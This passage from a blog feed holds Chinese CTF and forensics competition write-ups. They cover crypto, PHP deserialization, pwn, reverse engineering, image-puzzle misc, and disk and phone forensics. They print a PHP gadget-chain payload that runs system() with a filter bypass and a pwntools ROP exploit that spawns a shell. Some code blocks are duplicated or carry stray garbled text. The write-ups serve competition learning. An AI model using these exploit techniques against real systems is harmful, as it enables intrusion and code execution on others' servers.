21:33:46</code></pre><p>找到时间戳 再转换一下就行了</p><pre><code>1639014743</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852896.png" alt="image-20231024213326593"></p><h3 id="12-宝塔面板某用户曾尝试进行一次POST请求，参数为“-x2F-BTCloud-action-x3D-UploadFilesData”，请问该用户疑似使用的（-）电脑系统进行访问请求的。"><a href="#12-宝塔面板某用户曾尝试进行一次POST请求，参数为“-x2F-BTCloud-action-x3D-UploadFilesData”，请问该用户疑似使用的（-）电脑系统进行访问请求的。" class="headerlink" title="12.宝塔面板某用户曾尝试进行一次POST请求，参数为“&#x2F;BTCloud?action&#x3D;UploadFilesData”，请问该用户疑似使用的（ ）电脑系统进行访问请求的。"></a>12.宝塔面板某用户曾尝试进行一次POST请求，参数为“&#x2F;BTCloud?action&#x3D;UploadFilesData”，请问该用户疑似使用的（ ）电脑系统进行访问请求的。</h3><pre><code>A. Windows 8.1B. Windows 10C. Windows 11D. Windows Server 2000</code></pre><p>既然是请求 那就找request</p><p>在<code>/www/server/panel/logs/request</code> 下有宝塔的请求日志</p><p>在2022-07-23的日志中找到访问记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852140.png" alt="image-20231024213755779"></p><p><code>Windows NT 6.3</code>其实就是win8.1</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852411.png" alt="image-20231024213835795"></p><h3 id="13、请分析该服务器镜像最高权限“root”账户的密码是-。（标准格式：a123456）"><a href="#13、请分析该服务器镜像最高权限“root”账户的密码是-。（标准格式：a123456）" class="headerlink" title="13、请分析该服务器镜像最高权限“root”账户的密码是_______。（标准格式：a123456）"></a><strong>13、请分析该服务器镜像最高权限“root”账户的密码是_______。（标准格式：a123456）</strong></h3><p>找到&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow 直接hashcat爆破 我自己的字典爆不出来 QAQ  算是积累吧</p><pre><code>g123123</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2023龙信杯取证比赛wp&quot;&gt;&lt;a href=&quot;#2023龙信杯取证比赛wp&quot; class=&quot;headerlink&quot; title=&quot;2023龙信杯取证比赛wp&quot;&gt;&lt;/a&gt;2023龙信杯取证比赛wp&lt;/h1&gt;&lt;h2 id=&quot;移动终端取证&quot;&gt;&lt;a href=&quot;#移动终</summary>
      
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>香山杯-喵帕斯</title>
    <link href="http://w3nx1z1.github.io/2023/10/16/%E9%A6%99%E5%B1%B1%E6%9D%AF-%E5%96%B5%E5%B8%95%E6%96%AF/"/>
    <id>http://w3nx1z1.github.io/2023/10/16/%E9%A6%99%E5%B1%B1%E6%9D%AF-%E5%96%B5%E5%B8%95%E6%96%AF/</id>
    <published>2023-10-16T02:40:06.996Z</published>
    <updated>2023-10-18T01:09:30.111Z</updated>
    
    <content type="html"><![CDATA[<h1 id="香山杯-喵帕斯"><a href="#香山杯-喵帕斯" class="headerlink" title="香山杯 喵帕斯"></a>香山杯 喵帕斯</h1><p>感谢明琦和yolo师傅</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310180909578.png" alt="image-20231016102525193"></p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>base64+凯撒</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151929431.png" alt="image-20231015192934847"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151930321.png" alt="image-20231015193001284"></p><p>flag{we1c0m3_2_Ctf}</p><h2 id="list"><a href="#list" class="headerlink" title="list"></a>list</h2><p>题目附件</p><pre><code>import osimport gmpy2from Crypto.Util.number import *import randomfrom secrets import flagdef pad(s,l):    return s + os.urandom(l - len(s))def gen():    g = getPrime(8)    while True:        p = g * random.getrandbits(138) + 1        if isPrime(p):            break    while True:        q = g * random.getrandbits(138) + 1        if isPrime(q):            break    N = p ** 5 * q    phi = p ** 4 * (p - 1) * (q - 1)    d = random.getrandbits(256)    e = inverse(d, phi)    E = e * g    hint = gmpy2.gcd(E, phi)    return N, E, hintflag = pad(flag,64)m = bytes_to_long(flag)n,e,hint = gen()c = pow(m,e,n)print(f&#39;hint = &#123;hint&#125;&#39;)print(f&#39;n = &#123;n&#125;&#39;)print(f&#39;e = &#123;e&#125;&#39;)print(f&#39;c = &#123;c&#125;&#39;)# hint = 251# n = 108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077# e = 3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039# c = 72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162</code></pre><p>首先要恢复 p，q.</p><p>恢复p、q后就是在有限域内开高次方的问题。</p><p>恢复p、q参考论文：<a href="https://eprint.iacr.org/2015/399.pdf">https://eprint.iacr.org/2015/399.pdf</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151931587.png" alt="image-20231015193103519"></p><p>$e*d&#x3D;1\textbf{ }mod\textbf{ }phi,gcd(e,phi)&#x3D;1\Rightarrow$</p><p>$e<em>x-1&#x3D;k</em>phi\Rightarrow$</p><p>$因为n&#x3D;p^{r}<em>q,所以gcd(e</em>x-1,n)&#x3D;gcd(p^{r}<em>(p-1)</em>(q-1),p^{r}*q)&#x3D;p^{r}$</p><p>在多项式时间内求解上面方程，用 <strong>small_roots()</strong> 就能恢复 <strong>p</strong></p><p>exp</p><pre><code>from gmpy2 import *N = 108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077E = 3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039c = 72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162e = E//gPR.&lt;x&gt; = PolynomialRing(Zmod(N))f = e*x - 1res = f.monic().small_roots(X=2^256,beta=0.44)[0]p = iroot(gcd(int(f(res)),N),4)[0]q = N//p^5print(&#39;p,q=&#39;,p,q)# sage# 开251次方from Crypto.Util.number import *import itertoolshint = 251n = 108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077e = 3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039c = 72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162p,q=69367143733862710652791985332025152581988181 ,67842402383801764742069883032864699996366777p_list = [p,q]mi = [5, 1]# print(len(mi),len(p_list))n_list = [ZZ(p_list[i]) ** mi[i] for i in range(len(mi))]# print(n_list)# print(reduce((lambda x, y: x * y), n_list) - n)   # 0# print(euler_phi(p_list[0])) # 直接求欧拉函数res=[]for pi in n_list:    d = inverse(int(e//251),euler_phi(pi))     # 对n_listt 每一个 pi 求欧拉函数    m = pow(c,d,pi)                            # m = mm^108    res.append(Zmod(pi)(m).nth_root(251, all=True))   # nth_root # 最后一部分把 e 的公因数 108 去除之后用 sage 的 nth_root 直接开根即可，爆破大概7分钟。            # 在每一个pi环里 找到可以开108次方的放进result里面            # 在环里开108次方            # 会出来 9 个 list表 对应每个 pifor vc in itertools.product(*res):    _c = [int(x) for x in vc]    m = long_to_bytes(int(crt(_c, n_list)))    if b&quot;flag&quot; in m:        print(m)# b&#39;flag&#123;4b68c7eece6be865f6da2a4323edd491&#125;\x9d\xcf\xdc\xcb\xb8\xbdd\xec\xadh\xa6C\x99\xa0)7\xfb\x02\xba\x90q8\x10+\x7f&#125;&#39;</code></pre><h2 id="PHP-unserialize-pro"><a href="#PHP-unserialize-pro" class="headerlink" title="PHP_unserialize_pro"></a>PHP_unserialize_pro</h2><p>源码</p><pre><code class="php"> &lt;?php    error_reporting(0);    class Welcome&#123;        public $name;        public $arg = &#39;welcome&#39;;        public function __construct()&#123;            $this-&gt;name = &#39;Wh0 4m I?&#39;;        &#125;        public function __destruct()&#123;            if($this-&gt;name == &#39;A_G00d_H4ck3r&#39;)&#123;                echo $this-&gt;arg;            &#125;        &#125;    &#125;    class G00d&#123;        public $shell;        public $cmd;        public function __invoke()&#123;            $shell = $this-&gt;shell;            $cmd = $this-&gt;cmd;            if(preg_match(&#39;/f|l|a|g|\*|\?/i&#39;, $cmd))&#123;                die(&quot;U R A BAD GUY&quot;);            &#125;            eval($shell($cmd));        &#125;    &#125;    class H4ck3r&#123;        public $func;        public function __toString()&#123;            $function = $this-&gt;func;            $function();        &#125;    &#125;    if(isset($_GET[&#39;data&#39;]))        unserialize($_GET[&#39;data&#39;]);    else        highlight_file(__FILE__);?&gt; </code></pre><p>反序列化 最后记得绕过对<code>f1ag</code>的过滤 </p><pre><code class="php">&lt;?phpclass Welcome&#123;    public $name;    public $arg=&#39;welcome&#39;;    public function __construct()&#123;        $this-&gt;name = &#39;Wh0 4m I?&#39;;    &#125;    public function __destruct()&#123;        if($this-&gt;name == &#39;A_G00d_H4ck3r&#39;)&#123;            echo $this-&gt;arg;        &#125;    &#125; &#125;class G00d&#123;    public $shell;    public $cmd;&#125;class H4ck3r&#123;    public $func;    public function __toString()&#123;        $function = $this-&gt;func;        $function();    &#125; &#125;$a = new Welcome();$a-&gt;name = &#39;A_G00d_H4ck3r&#39;;$a-&gt;arg = new H4ck3r();$a-&gt;arg-&gt;func = new G00d();$a-&gt;arg-&gt;func-&gt;shell = &#39;system&#39;;$a-&gt;arg-&gt;func-&gt;$cmd = &#39;cd /;more `php -r &quot;echo chr(102).chr(49).chr(97).chr(103);&quot;`&#39;;echo urlencode(serialize($a));xxxxxxxxxx &lt;?php&lt;?phpclass Welcome&#123;    public $name;    public $arg=&#39;welcome&#39;;    public function __construct()&#123;        $this-&gt;name = &#39;Wh0 4m I?&#39;;    &#125;    public function __destruct()&#123;        if($this-&gt;name == &#39;A_G00d_H4ck3r&#39;)&#123;            echo $this-&gt;arg;        &#125;    &#125; &#125;class G00d&#123;    public $shell;    public $cmd;&#125;class H4ck3r&#123;    public $func;    public function __toString()&#123;        $function = $this-&gt;func;        $function();    &#125; &#125;$a = new Welcome();$a-&gt;name = &#39;A_G00d_H4ck3r&#39;;$a-&gt;arg = new H4ck3r();$a-&gt;arg-&gt;func = new G00d();$a-&gt;arg-&gt;func-&gt;shell = &#39;system&#39;;$a-&gt;arg-&gt;func-&gt;$cmd = &#39;cd /;more `php -r &quot;echo chr(102).chr(49).chr(97).chr(103);&quot;`&#39;;echo urlencode(serialize($a));</code></pre><h2 id="Move"><a href="#Move" class="headerlink" title="Move"></a>Move</h2><p>64 位小端序</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151940550.png" alt="image-20231015194046469"></p><p>IDA 反编译</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151941050.png" alt="image-20231015194100001"></p><p>再 bss 段输入 0x20 个字节，然后判断，成功则获得 0x10 个字节溢出</p><p>1、利用 bss 段泄露 libc</p><pre><code class="python">from pwn import *from LibcSearcher import *context(arch=&#39;amd64&#39;,log_level=&#39;debug&#39;,os=&#39;linux&#39;)io = process(&#39;./pwn&#39;)pop_rdi_ret = 0x0000000000401353 #: pop rdi ; retelf = ELF(&#39;./pwn&#39;)puts_plt = elf.plt[&#39;puts&#39;]puts_got = elf.got[&#39;puts&#39;]main = elf.sym[&#39;main&#39;]shellcode = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)io.sendafter(&#39;lets travel again!\n&#39;,shellcode) #shellcode 刚 好 0x20 个 字 节 ， 所 以 不 能 使 用sendline，不然会产生回车多出了一个字节io.sendafter(&#39;Input your setp number&#39;,&#39;\x78\x56\x34\x12&#39;) #由于是小端序，所以 0x12345678 要反着写，也要使用 send，不能使用 sendlinebss = 0x04050A0leave_ret = 0x040124Bpayload = &#39;a&#39;*0x30 + p64(bss-8) + p64(leave_ret) #劫持 ebp 为 bss 的前八个字节地址（因为两个 leave，ret 会往后跳 8 个字节）--跳转到 bss 执行 shellio.sendafter(&#39;TaiCooLa&#39;,payload) #也要使用 send，不能使用 sendlineputs = u64(io.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;)) #泄露 puts 函数的真实地址print(hex(puts))</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151941437.png" alt="image-20231015194158364"></p><p>2、泄露 libc</p><pre><code>libc = LibcSearcher(&#39;puts&#39;,puts)libc_base = puts - libc.dump(&#39;puts&#39;)system = libc_base + libc.dump(&#39;system&#39;)bin_sh = libc_base + libc.dump(&#39;str_bin_sh&#39;)</code></pre><p>3、执行 shell</p><pre><code>shellcode = p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + p64(main)io.sendafter(&#39;lets travel again!\n&#39;,shellcode)payload = &#39;a&#39;*0x30 + p64(bss-8) + p64(leave_ret)io.interactive()</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151942198.png" alt="image-20231015194223148"></p><p>最终 exp</p><pre><code class="python">from pwn import *from LibcSearcher import *context(arch=&#39;amd64&#39;,log_level=&#39;debug&#39;,os=&#39;linux&#39;)io = process(&#39;./pwn&#39;)pop_rdi_ret = 0x0000000000401353 #: pop rdi ; retelf = ELF(&#39;./pwn&#39;)puts_plt = elf.plt[&#39;puts&#39;]puts_got = elf.got[&#39;puts&#39;]main = elf.sym[&#39;main&#39;]shellcode = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)io.sendafter(&#39;lets travel again!\n&#39;,shellcode)io.sendafter(&#39;Input your setp number&#39;,&#39;\x78\x56\x34\x12&#39;)bss = 0x04050A0leave_ret = 0x040124Bpayload = &#39;a&#39;*0x30 + p64(bss-8) + p64(leave_ret)io.sendafter(&#39;TaiCooLa&#39;,payload)puts = u64(io.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))print(hex(puts))libc = LibcSearcher(&#39;puts&#39;,puts)libc_base = puts - libc.dump(&#39;puts&#39;)system = libc_base + libc.dump(&#39;system&#39;)bin_sh = libc_base + libc.dump(&#39;str_bin_sh&#39;)shellcode = p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + p64(main)io.sendafter(&#39;lets travel again!\n&#39;,shellcode)payload = &#39;a&#39;*0x30 + p64(bss-8) + p64(leave_ret)io.interactive()</code></pre><h2 id="URL从哪儿来"><a href="#URL从哪儿来" class="headerlink" title="URL从哪儿来"></a>URL从哪儿来</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151945358.png" alt="image-20231015194532321"></p><p>拖到32位ida反编译后发现进行了写入文件的操作，下断点动调</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151945292.png" alt="image-20231015194546262"></p><p>双击跟进 TempFlieName 找到文件名和路径 </p><p>一直运行程序发现进行了 CloseHandle 和 DeleteFileA 的操作</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151946083.png" alt="image-20231015194603036"></p><p>重新动调，在 CloseHandle 操作前下断点然后去查看生成的临时tmp文件 </p><p>因为开启第二次动调，发现每次生成文件的文件名都不同，这次是7379</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151946840.png" alt="image-20231015194620797"></p><p>用010打开发现文件头是PE的头</p><p>改后缀为.exe后拖入ida分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151946768.png" alt="image-20231015194637735"></p><p>先是拿到一堆数据</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151946567.png" alt="image-20231015194651522"></p><p>发现进行了赋值到Block并进行了-30 的操作</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151947108.png" alt="image-20231015194702075"></p><p>跟进一下sub_401110()函数</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151948703.png" alt="image-20231015194823672"></p><p>简单分析一下走了一个base64解码</p><pre><code class="python">import base64 cipher = [0x78, 0x8B, 0x96, 0x86, 0x78, 0x51, 0x91, 0x50, 0x6C, 0x62, 0x77, 0x53, 0x6C, 0x88, 0x63, 0x50, 0x78, 0x71, 0x4E, 0x50, 0x6B, 0x98, qui1t_p3n qui1t_p3n       0x77, 0x53, 0x6A, 0x72, 0x77, 0x97, 0x6C, 0x8B, 0x77, 0x92, 0x6C, 0x98, 0x63, 0x50, 0x6D, 0x71, 0x4E, 0x51, 0x6C, 0x62, 0x77, 0x96, 0x6C, 0x98, 0x5F,0x50, 0x6B, 0x72, 0x81, 0x51, 0x6C, 0x88, 0x64, 0x57] code = &quot;&quot; for i in range(len(cipher)):    code += chr(cipher[i] - 30) print(code) print(base64.b64decode(code)) #输出结果：#ZmxhZ3s2NDY5NjE2ZS02MzY5LTYyNmYtNzE2OS03NDYxNzA2MTc3NjF9 #b&#39;flag&#123;6469616e-6369-626f-7169-746170617761&#125;’</code></pre><h2 id="pintu"><a href="#pintu" class="headerlink" title="pintu"></a>pintu</h2><p>用montage和gaps搞了半天拼图 以为是二维码</p><p>然后并不行 查看了几个图片的大小 发现宽度都是65  但是高度各不相同 </p><p>写个脚本 分析这4703张图片的高度 并将相同高度的图片放到相同文件夹中</p><pre><code class="python">import osfrom PIL import Imageimport shutil# 输入文件夹的路径input_folder = &quot;E:\Desktop/2023香山杯\misc\pintu_26914c79abf08a72af534387e23ffdf6\pintu&quot;# 创建一个字典，用于存储不同高度的图片列表height_to_images = &#123;&#125;# 遍历输入文件夹中的图片for filename in os.listdir(input_folder):    if filename.endswith(&quot;.jpg&quot;) or filename.endswith(&quot;.png&quot;):        file_path = os.path.join(input_folder, filename)        # 打开图片并获取其高度        with Image.open(file_path) as img:            height = img.height        # 如果高度不在字典中，则创建一个新列表        if height not in height_to_images:            height_to_images[height] = []        # 将图片添加到对应高度的列表中        height_to_images[height].append(filename)# 遍历字典，将同一高度的图片复制到对应的输出文件夹中for height, images in height_to_images.items():    # 创建输出文件夹    output_folder = os.path.join(&quot;output_folder&quot;, str(height))    os.makedirs(output_folder, exist_ok=True)    for image_filename in images:        input_path = os.path.join(input_folder, image_filename)        output_path = os.path.join(output_folder, image_filename)        # 复制图片        shutil.copy(input_path, output_path)print(&quot;图片分类完成&quot;)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310152006808.png" alt="image-20231015200652767"></p><p>再加上提示的<code>tip.jpg</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310152011590.png" alt="image-20231015201119560"></p><p>联想到8进制转10进制 再看高度也符合8进制的特点</p><p>写个脚本将所有图片的高度提取出来</p><pre><code class="python">import osfrom PIL import Image# 输入文件夹的路径input_folder = &quot;E:\Desktop\pintu\pintu&quot;# 创建一个空的文本文件用于写入高度数据output_file = &quot;E:\Desktop\pintu\pintu/height.txt&quot;# 获取文件夹中所有图片文件的列表image_files = [filename for filename in os.listdir(input_folder) if filename.endswith((&quot;.png&quot;))]# 打开文本文件以进行写入with open(output_file, &quot;w&quot;) as f:    # 遍历文件夹中的图片文件列表    for i in range(1, 4074):        filename = f&#39;&#123;i&#125;.png&#39;        img = Image.open(f&#39;&#123;input_folder&#125;/&#123;filename&#125;&#39;)        height = img.height        # 将高度写入文本文件，按顺序        f.write(f&quot;&#123;height&#125;&quot;+&quot; &quot;)print(&quot;高度数据已按顺序写入 height.txt 文件&quot;)</code></pre><p>再将其转8进制 再将其转ascii码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310152046241.png" alt="image-20231015204618175"></p><pre><codecode></pre><p>再将图片的颜色的黑白 转化为0和1</p><pre><code class="python">from PIL import Imageimport oscolor = &quot;&quot;a = []for i in range(1,4704):    img = Image.open(&quot;./&#123;&#125;.png&quot;.format(i))    width,height=img.size    tmp = img.getpixel((0,0))    if (tmp == (0,0,0)):        color += &quot;0&quot;    elif(tmp == (255,255,255)):        color += &quot;1&quot;    a.append(chr(int(str(height), 8 )))print(color)</code></pre><p>在转字符串</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310152052620.png" alt="image-20231015205246528"></p><p>得到换表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310152053953.png" alt="image-20231015205336865"></p><p>保存为图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310152054963.png" alt="image-20231015205412875"></p><p>但是少文件尾 </p><p>用脚本进行上述步骤 就可以补全文件尾</p><pre><code class="python">from PIL import Imagefrom libnum import n2sfrom base64 import b32decode, b64decodeimport osbin_data = &#39;&#39;dec_data = &#39;&#39;image_directory = &#39;./pintu/&#39;for i in range(1, 4704):    image_path = os.path.join(image_directory, f&#39;&#123;i&#125;.png&#39;)    if os.path.exists(image_path):        # Open the image and extract data        with Image.open(image_path) as image:            pixel = image.getpixel((0, 0))            dec_data += chr(int(str(image.height), 8))            bin_data += &#39;1&#39; if pixel == (255, 255, 255) else &#39;0&#39;bin_data = bin_data.ljust(((len(bin_data) + 7) // 8) * 8, &#39;0&#39;)new_b64 = &#39;sUvcu5rgSeAmJQCfdXtEMKIB91Lj3niOo4hyV0b/2azpx8HqZP6wk7GNlTFYDR+W&#39;old_b64 = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;data = &#39;&#39;for dec in dec_data.split(&#39; &#39;):    data += chr(int(dec, 10))data = b32decode(data).decode()trans = &#39;&#39;.maketrans(new_b64, old_b64)b64png = b64decode(data.translate(trans)).decode().split(&#39; &#39;)[0]png_data = b64decode(b64png)with open(&#39;./flag.png&#39;, &#39;wb&#39;) as f:    f.write(png_data)</code></pre><p>一眼抽象画npiet解密</p><pre><code>.\npiet.exe -tpic E:\Desktop\pintu\flag.png</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310161002747.png" alt="image-20231016100212654"></p><p>得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;香山杯-喵帕斯&quot;&gt;&lt;a href=&quot;#香山杯-喵帕斯&quot; class=&quot;headerlink&quot; title=&quot;香山杯 喵帕斯&quot;&gt;&lt;/a&gt;香山杯 喵帕斯&lt;/h1&gt;&lt;p&gt;感谢明琦和yolo师傅&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubuse</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>2023蓝帽杯初赛取证wp</title>
    <link href="http://w3nx1z1.github.io/2023/09/13/2023%E5%B9%B4%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B%E5%8F%96%E8%AF%81wp/"/>
    <id>http://w3nx1z1.github.io/2023/09/13/2023%E5%B9%B4%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B%E5%8F%96%E8%AF%81wp/</id>
    <published>2023-09-13T12:55:49.254Z</published>
    <updated>2023-09-24T13:34:07.636Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023年蓝帽杯初赛取证wp"><a href="#2023年蓝帽杯初赛取证wp" class="headerlink" title="2023年蓝帽杯初赛取证wp"></a>2023年蓝帽杯初赛取证wp</h1><h2 id="手机"><a href="#手机" class="headerlink" title="手机"></a>手机</h2><h3 id="06-该镜像是用的什么模拟器？-答题格式-天天模拟器"><a href="#06-该镜像是用的什么模拟器？-答题格式-天天模拟器" class="headerlink" title="06.该镜像是用的什么模拟器？[答题格式:天天模拟器]"></a>06.该镜像是用的什么模拟器？[答题格式:天天模拟器]</h3><p>一眼雷电</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309192328922.png" alt="image-20230919232830871"></p><pre><code>雷电模拟器</code></pre><h3 id="07-该镜像中用的聊天软件名称是什么？-答题格式-微信"><a href="#07-该镜像中用的聊天软件名称是什么？-答题格式-微信" class="headerlink" title="07.该镜像中用的聊天软件名称是什么？[答题格式:微信]"></a>07.该镜像中用的聊天软件名称是什么？[答题格式:微信]</h3><p>将三个vmdk文件拖进火眼进行分析  找到一个聊天软件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309202232441.png" alt="image-20230920223249341"></p><pre><code>与你</code></pre><h3 id="08-聊天软件的包名是？-答题格式-com-baidu-ces"><a href="#08-聊天软件的包名是？-答题格式-com-baidu-ces" class="headerlink" title="08.聊天软件的包名是？[答题格式:com.baidu.ces]"></a>08.聊天软件的包名是？[答题格式:com.baidu.ces]</h3><p>直接搜hhh</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131425.png" alt="image-20230920225745076"></p><pre><code>com.uneed.yuni</code></pre><h3 id="09-投资理财产品中，受害人最后投资的产品最低要求投资多少钱？-答题格式-1万"><a href="#09-投资理财产品中，受害人最后投资的产品最低要求投资多少钱？-答题格式-1万" class="headerlink" title="09.投资理财产品中，受害人最后投资的产品最低要求投资多少钱？[答题格式:1万]"></a>09.投资理财产品中，受害人最后投资的产品最低要求投资多少钱？[答题格式:1万]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131426.png" alt="image-20230920230536139"></p><pre><code>5万</code></pre><h3 id="10-受害人是经过谁介绍认识王哥？-答题格式-董慧"><a href="#10-受害人是经过谁介绍认识王哥？-答题格式-董慧" class="headerlink" title="10.受害人是经过谁介绍认识王哥？[答题格式:董慧]"></a>10.受害人是经过谁介绍认识王哥？[答题格式:董慧]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131427.png" alt="image-20230920230623912"></p><pre><code>华哥</code></pre><h2 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h2><h3 id="11-请给出计算机镜像pc-e01的SHA-1值？-答案格式：字母小写"><a href="#11-请给出计算机镜像pc-e01的SHA-1值？-答案格式：字母小写" class="headerlink" title="11.请给出计算机镜像pc.e01的SHA-1值？[答案格式：字母小写]"></a>11.请给出计算机镜像pc.e01的SHA-1值？[答案格式：字母小写]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131428.png" alt="image-20230915153259619"></p><pre><code>ea9dcc3d43df4c6448bb56e7ac820619d66fe821</code></pre><h3 id="12-给出pc-e01在提取时候的检查员？-答案格式：admin"><a href="#12-给出pc-e01在提取时候的检查员？-答案格式：admin" class="headerlink" title="12.给出pc.e01在提取时候的检查员？[答案格式：admin]"></a>12.给出pc.e01在提取时候的检查员？[答案格式：admin]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309172318674.png" alt="image-20230917231807642"></p><pre><code>pgs</code></pre><h3 id="13-请给出嫌疑人计算机内IE浏览器首页地址？-答案格式：http-www-baidu-com"><a href="#13-请给出嫌疑人计算机内IE浏览器首页地址？-答案格式：http-www-baidu-com" class="headerlink" title="13.请给出嫌疑人计算机内IE浏览器首页地址？[答案格式：http://www.baidu.com]"></a>13.请给出嫌疑人计算机内IE浏览器首页地址？[答案格式：<a href="http://www.baidu.com]">http://www.baidu.com]</a></h3><pre><code>http://global.bing.com/?scope=web&amp;mkt=en-US&amp;FORM=QBRE</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309172251710.png" alt="image-20230917225110469"></p><h3 id="14-请给出嫌疑人杨某登录理财网站前台所用账号密码？-答案格式：root-x2F-admin"><a href="#14-请给出嫌疑人杨某登录理财网站前台所用账号密码？-答案格式：root-x2F-admin" class="headerlink" title="14.请给出嫌疑人杨某登录理财网站前台所用账号密码？[答案格式：root&#x2F;admin]"></a>14.请给出嫌疑人杨某登录理财网站前台所用账号密码？[答案格式：root&#x2F;admin]</h3><h3 id="15-请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？-答案格式：xxxx-xx"><a href="#15-请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？-答案格式：xxxx-xx" class="headerlink" title="15.请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？[答案格式：xxxx(xx)]"></a>15.请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？[答案格式：xxxx(xx)]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309172313216.png" alt="image-20230917231314046"></p><pre><code>2023春季更新(14309)</code></pre><h3 id="16-请给出嫌疑人计算机内文件名为“C盘清理-bat”的SHA-1？-答案格式：字母小写"><a href="#16-请给出嫌疑人计算机内文件名为“C盘清理-bat”的SHA-1？-答案格式：字母小写" class="headerlink" 